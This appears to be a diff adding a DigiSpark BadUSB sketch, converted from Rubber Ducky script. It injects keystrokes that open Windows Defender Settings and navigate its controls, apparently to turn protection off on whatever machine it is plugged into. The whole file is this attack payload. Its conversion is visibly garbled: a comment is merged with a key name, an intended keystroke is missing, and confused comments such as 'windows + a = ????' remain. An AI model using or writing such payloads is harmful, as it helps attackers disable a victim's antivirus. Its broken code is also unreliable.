@@ -1,0 +1,30 @@
+// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 
+
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(41);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,41);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("Windows Defender Settings");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  // why TAB and HOME?
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.delay(50);
+  // why TAB and HOME?HOME
+  DigiKeyboard.delay(50);
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_F4);
+  DigiKeyboard.delay(3200);
+  // windows + a = ????
+  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT,KEY_A);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT,KEY_A);
+}
